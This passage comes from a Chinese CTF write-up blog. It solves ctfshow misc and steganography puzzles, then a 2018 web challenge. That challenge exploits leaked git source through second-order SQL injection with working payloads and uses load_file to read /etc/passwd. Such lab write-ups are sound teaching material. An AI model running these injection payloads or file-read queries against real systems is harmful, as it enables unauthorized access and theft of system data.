alt="image-20230328213440485"></p><p>打开后存在加密压缩包，密钥：<code>KEY&#123;Lazy_Man&#125;</code></p><p>打开，发现一串编码，发现这段编码进行了多次base64和base32加密</p><p>我们使用正则匹配识别并解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/secenc.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>data = f.read().encode()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;^[2-7A-Z=]+$&#x27;</span>, data.decode()):<br>        data = base64.b32decode(data)<br>    <span class="hljs-keyword">elif</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;^[0-9a-zA-Z=+/]+$&#x27;</span>, data.decode()):<br>        data = base64.b64decode(data)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(data.decode())<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>输出：</p><p><img src="https://s2.loli.net/2023/03/28/OVFiIwGzD67nW4T.png" alt="image-20230328214846862"></p><p>这应该是<code>Ook!</code>编码，但是是简化形式的，我们之间使用网站解密：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">+++++</span> <span class="hljs-literal">+++++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">++</span> <span class="hljs-literal">+++++</span> <span class="hljs-literal">+++</span>&lt;<span class="hljs-title">]</span> &gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span><span class="hljs-literal">+</span> <span class="hljs-literal">+++++</span> <span class="hljs-string">.</span>&lt;<span class="hljs-literal">+++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">--</span> <span class="hljs-literal">-</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">+++</span> <span class="hljs-literal">+++</span><span class="hljs-string">.</span>&lt;<br><span class="hljs-literal">++++</span><span class="hljs-title">[</span> <span class="hljs-literal">-</span>&gt;<span class="hljs-literal">+++</span> <span class="hljs-literal">+</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">+</span> <span class="hljs-literal">+++</span><span class="hljs-string">.</span>&lt; <span class="hljs-literal">+++++</span> <span class="hljs-literal">+</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-</span> <span class="hljs-literal">-----</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-string">.</span>&lt; <span class="hljs-literal">+++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span> &gt;<span class="hljs-literal">+++</span>&lt; <span class="hljs-title">]</span>&gt;<span class="hljs-literal">+++</span> <span class="hljs-literal">++</span><span class="hljs-string">.</span><span class="hljs-literal">++</span><br><span class="hljs-literal">+++++</span> <span class="hljs-string">.</span><span class="hljs-literal">----</span> <span class="hljs-literal">-----</span> <span class="hljs-string">.</span>&lt;<span class="hljs-literal">+++</span> <span class="hljs-literal">++++</span><span class="hljs-title">[</span> <span class="hljs-literal">-</span>&gt;<span class="hljs-literal">---</span> <span class="hljs-literal">----</span>&lt; <span class="hljs-title">]</span>&gt;<span class="hljs-literal">--</span><span class="hljs-string">.</span> &lt;<span class="hljs-literal">++++</span> <span class="hljs-literal">+++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span> &gt;<span class="hljs-literal">++++</span> <span class="hljs-literal">+++</span>&lt;<span class="hljs-title">]</span><br>&gt;<span class="hljs-literal">++++</span> <span class="hljs-literal">+++++</span> <span class="hljs-literal">+++</span><span class="hljs-string">.</span><span class="hljs-literal">-</span> <span class="hljs-literal">-----</span> <span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">--</span> <span class="hljs-literal">----</span><span class="hljs-string">.</span> &lt;<span class="hljs-literal">++++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">++</span> <span class="hljs-literal">++</span>&lt;<span class="hljs-title">]</span>&gt; <span class="hljs-literal">+++++</span> <span class="hljs-string">.</span>&lt;<span class="hljs-literal">+++</span> <span class="hljs-literal">+++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span><br>&gt;<span class="hljs-literal">----</span> <span class="hljs-literal">--</span>&lt;<span class="hljs-title">]</span>&gt; <span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">++</span> <span class="hljs-literal">++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt; <span class="hljs-literal">++++</span>&lt; <span class="hljs-title">]</span>&gt;<span class="hljs-string">.</span><span class="hljs-literal">++</span> <span class="hljs-literal">++</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+</span> <span class="hljs-literal">++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt; <span class="hljs-literal">---</span>&lt;<span class="hljs-title">]</span> &gt;<span class="hljs-literal">----</span> <span class="hljs-literal">--</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+</span> <span class="hljs-literal">+++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span><br>&gt;<span class="hljs-literal">++++</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">++</span> <span class="hljs-string">.</span><span class="hljs-literal">----</span> <span class="hljs-literal">---</span><span class="hljs-string">.</span>&lt; <span class="hljs-literal">+++++</span> <span class="hljs-literal">+</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-</span> <span class="hljs-literal">-----</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">--</span> <span class="hljs-literal">-----</span> <span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">++</span> <span class="hljs-literal">+++++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">++</span><br><span class="hljs-literal">+++++</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">++</span> <span class="hljs-literal">++</span><span class="hljs-string">.</span><span class="hljs-literal">++</span> <span class="hljs-literal">+++++</span> <span class="hljs-string">.</span><span class="hljs-literal">++++</span> <span class="hljs-literal">++++</span><span class="hljs-string">.</span> &lt;<span class="hljs-literal">++++</span> <span class="hljs-literal">+++++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">--</span> <span class="hljs-literal">-----</span> <span class="hljs-literal">--</span>&lt;<span class="hljs-title">]</span>&gt; <span class="hljs-literal">-----</span><br><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+++</span> <span class="hljs-literal">+++++</span> <span class="hljs-literal">+</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">+</span> <span class="hljs-literal">+++++</span> <span class="hljs-literal">+++</span>&lt;<span class="hljs-title">]</span> &gt;<span class="hljs-literal">++++</span> <span class="hljs-literal">+++++</span> <span class="hljs-literal">++</span><span class="hljs-string">.</span>&lt;<br></code></pre></td></tr></table></figure><p>这是brainfuck编码，我们解密得到flag</p><h3 id="misc30"><a href="#misc30" class="headerlink" title="misc30"></a>misc30</h3><p>在星空.jpg的exif属性中找到了doc文档的解压密码：</p><img src="https://s2.loli.net/2023/03/29/jshcuwRTezkNWBE.png" alt="image-20230329145016357" style="zoom:50%;" /><p>打开文档：</p><img src="https://s2.loli.net/2023/03/29/L6wnPBVpZXFMsHl.png" alt="image-20230329145128584" style="zoom:33%;" /><p>密码是白色字体，我们修改为有颜色，得到的英文就是flag的解压密码。</p><p>解压后得到一个二维码，扫码得到flag</p><h3 id="stega1"><a href="#stega1" class="headerlink" title="stega1"></a>stega1</h3><p>jphs隐写，使用工具<code>jphswin</code>，直接seek保存为txt文件，无密码：</p><img src="https://s2.loli.net/2023/03/29/7tfVpD5j6Za38qb.png" alt="image-20230329150734732" style="zoom: 50%;" /><h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>键盘密码：</p><p><img src="https://s2.loli.net/2023/03/29/eskODlWXIM3FnBV.png" alt="image-20230329151526018"></p><p>flag{av}</p><h3 id="misc40"><a href="#misc40" class="headerlink" title="misc40"></a>misc40</h3><p><img src="https://s2.loli.net/2023/03/29/xMtYTEKsrip1m6G.png" alt="image-20230329153807530"></p><p>扫描二维码，什么也没有，我们010打开：</p><img src="https://s2.loli.net/2023/03/29/A9jRkTSKZiuzUOy.png" alt="image-20230329153856136" style="zoom: 50%;" /><p>这是brankfuck编码，我们解密：</p><img src="https://s2.loli.net/2023/03/29/fkIZh48EzVqnpUK.png" alt="image-20230329153932959" style="zoom:33%;" /><p>社会主义核心价值观编码，我们解密：<code>123456</code></p><p>然后我们听一下mp3文件，很熟悉的感觉，这需要工具：<code>MP3Stego</code>，密码为：123456</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tp">decode -<span class="hljs-keyword">X</span> svega.mp<span class="hljs-number">3</span> -<span class="hljs-keyword">P</span> <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/03/29/Kzw9dafM5ZRe4V1.png" alt="image-20230329154355993" style="zoom:33%;" /><p>静默之眼，英文类似：<code>Silent Eye</code> 使用工具打开wav文件</p><p>打开txt文件，</p><img src="https://s2.loli.net/2023/03/29/yaz69p4lIW3tGsq.png" alt="image-20230329154023355" style="zoom:33%;" /><p>将其转为10进制:</p><img src="https://s2.loli.net/2023/03/29/AInLY6QP8KObCtw.png" alt="image-20230329154108860" style="zoom: 33%;" /><p>密码：202013</p><p>于是我们使用<code>Silent Eye</code>解密：</p><img src="https://s2.loli.net/2023/03/29/JIAviR4V7OT95XY.png" alt="image-20230329154650830" style="zoom: 33%;" /><p>注意需要将质量调为high，解密密钥为AES128型</p><h3 id="misc30-1"><a href="#misc30-1" class="headerlink" title="misc30"></a>misc30</h3><p>zip伪加密</p><img src="https://s2.loli.net/2023/03/29/XrDxNYBWqRwCvfn.png" alt="image-20230329155118656" style="zoom:33%;" /><p>分离MP3文件，得到一种jpg图片：</p><img src="https://s2.loli.net/2023/03/29/3u581hDz4GEZtwn.png" alt="image-20230329170209836" style="zoom:50%;" /><p>看样子高度被改过，我们需要将高度改高点：</p><img src="https://s2.loli.net/2023/03/29/VXm89GcS5yHtDuz.png" alt="image-20230329170606376" style="zoom: 33%;" /><p>打开图片：</p><img src="https://s2.loli.net/2023/03/29/56DsBuYOaXUwK9I.png" alt="image-20230329170316647" style="zoom:50%;" /><p>猪圈密码，解密：<code>well done</code></p><h3 id="stega10"><a href="#stega10" class="headerlink" title="stega10"></a>stega10</h3><blockquote><p>最终url需要将lanzous换成lanzoux，否则会出现社死现象</p></blockquote><p>下载后得到一张jpg图片，在010中打开：</p><p><img src="https://s2.loli.net/2023/03/30/LErDWpTowf8kigy.png" alt="image-20230330165606000"></p><p>发现base64编码(少了两个&#x3D;)，解密：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.lanzous.com/i9b0ksd<br>将s换为x<br>https:<span class="hljs-regexp">//</span>www.lanzoux.com/i9b0ksd<br></code></pre></td></tr></table></figure><p>访问后下载文件，得到加密zip文件：</p><img src="https://s2.loli.net/2023/03/30/4HZ9hBx6lmvoLu3.png" alt="image-20230330165905628" style="zoom: 33%;" /><p>(到这里不会了，需要crc32爆破)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> binascii<br>s = string.printable<br>c = [<span class="hljs-number">0xF3B61B38</span>,<span class="hljs-number">0xF3B61B38</span>,<span class="hljs-number">0X6ABF4A82</span>,<span class="hljs-number">0X5ED1937E</span>,<span class="hljs-number">0X09b9265b</span>,<span class="hljs-number">0x84b12bae</span>,<span class="hljs-number">0x70659eff</span>,<span class="hljs-number">0x90b077e1</span>,<span class="hljs-number">0x6abf4a82</span>]<br>password = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> crc <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> crc == (binascii.crc32(i.encode())):<br>            password = password + i<br>            <span class="hljs-built_in">print</span>(password)<br>            <br>密码：<br><span class="hljs-number">447</span>^*<span class="hljs-number">5</span><span class="hljs-comment">#)7</span><br></code></pre></td></tr></table></figure><p>解压得到一张图片，010打开：</p><p><img src="https://s2.loli.net/2023/03/30/H18P3YTLs5hCgwE.png" alt="image-20230330170038823"></p><p>我们发现数据都颠倒过来了，我们写个脚本反过来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/n.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/flag.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>data = fp.read()[::-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(f.write(data))<br></code></pre></td></tr></table></figure><p>得到二维码，扫码即可</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Comment</title>
    <link href="/2023/08/24/Comment/"/>
    <url>/2023/08/24/Comment/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>进去发现一个留言板，测试了一下好像没什么东西</p><p><img src="https://s2.loli.net/2023/05/14/XIvKMilZVmdCjcJ.png" alt="image-20230514131240742"></p><p>然后目录扫描一下，发现了git泄露，用<code>GitHack</code>获取</p><p><img src="https://s2.loli.net/2023/05/14/GoM1D9A8zbJgBas.png" alt="image-20230514131418239"></p><p>发现没什么东西，然后我们使用 <code>git log --all</code>查看所有分支的git提交记录：</p><p><img src="https://s2.loli.net/2023/05/14/sKbl7eNoX5HBFVv.png" alt="image-20230514131506750"></p><p>切换到第一个：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">git reset --hard e<span class="hljs-number">5</span>b<span class="hljs-number">2</span>a<span class="hljs-number">2443</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>b<span class="hljs-number">6</span>d<span class="hljs-number">395</span>d<span class="hljs-number">06960123142</span>bc<span class="hljs-number">91123148</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p>获取到完整php文件内容：</p><p>write_do.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>仔细分析一下，发现 <code>category</code>变量存在二次注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>...<br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>在<code>write</code>写的时候，使用了<code>addslashes()</code>函数，会将单引号 <code>&#39;</code>、双引号<code>&quot;</code>、反斜杠 <code>\</code>等 加上一个反斜杠转义</p><p>然后<code>comment</code>中取出 <code>category</code>，但是没有进行转义，这就造成了二次注入漏洞</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;<br>...<br>$category <span class="hljs-operator">=</span> mysql_fetch_array($<span class="hljs-keyword">result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br></code></pre></td></tr></table></figure><p>但是在<code>write</code>中使用 <code>addslashes()</code>后，<strong>存入数据库时并不会将转义后添加的<code>\</code>存入数据库中</strong></p><p>于是我们先在<code>write</code>中写入：</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">&#x27;,content</span>=<span class="hljs-string">user(),/*</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/05/14/LyisATHFCwo8mvj.png" alt="image-20230514132606523" style="zoom:50%;" /><p>但是提示我们需要登录，直接爆破一下，密码加上666</p><p>然后在<code>comment</code>中为<code>content</code>赋值：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">content</span>=*/<span class="hljs-comment">#&amp;bo_id=14</span><br></code></pre></td></tr></table></figure><p>这是什么意思呢？</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">$category <span class="hljs-operator">=</span> mysql_fetch_array($<span class="hljs-keyword">result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>$content <span class="hljs-operator">=</span> addslashes($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;insert into comment<br>            set category = &#x27;$category&#x27;,<br>                content = &#x27;$content&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;&quot;;<br></code></pre></td></tr></table></figure><p>将category取出，然后再为content赋值，代码变成了这样：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;insert into comment<br>            set category = &#x27;&#x27;,content=user(),/*&#x27;,<br>                content = &#x27;*/#&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;&quot;;<br></code></pre></td></tr></table></figure><p>这里我们恰好注释掉了 <code>content</code>，将其设置为自定义的。</p><p>&#x2F;**&#x2F;可以多行注释。#只能单行注释，注释掉了后面的 <code>&#39;,</code></p><p><img src="https://s2.loli.net/2023/05/14/ul1EFGvyRDQkrL2.png" alt="image-20230514133313615"></p><p>查询出来了root权限。</p><p>然后继续查库名、表名。。发现查询不到flag</p><p>由于此处是 root权限，可以使用 <code>load_file()</code>函数读取文件，我们读取一下 <code>/etc/passwd</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">category=&#x27;,content=load_file(<span class="hljs-string">&quot;/etc/passwd&quot;</span>),/*<br></code></pre></td></tr></table></figure><blockquote><p><code>/etc/passwd</code> 是一个文件，它记录了系统上的用户账号信息。每行记录表示一个用户账号，每行记录包含了如下字段：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">username:</span><span class="hljs-symbol">password:</span><span class="hljs-variable constant_">UID</span><span class="hljs-symbol">:GID</span><span class="hljs-symbol">:GECOS</span><span class="hljs-symbol">:home_directory</span><span class="hljs-symbol">:login_shell</span><br></code></pre></td></tr></table></figure><ul><li><code>username</code>：用户登录名</li><li><code>password</code>：加密后的用户密码，现在一般为 “x”，表示密码存储在 <code>/etc/shadow</code> 文件中</li><li><code>UID</code>：用户ID，是一个整数值，用来唯一标识该用户</li><li><code>GID</code>：用户所属的组ID</li><li><code>GECOS</code>：用户的全名或注释信息</li><li><code>home_directory</code>：用户的主目录</li><li><code>login_shell</code>：用户登录后使用的默认shell程序</li></ul><p>例如，下面是一个 <code>/etc/passwd</code> 文件的示例：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span 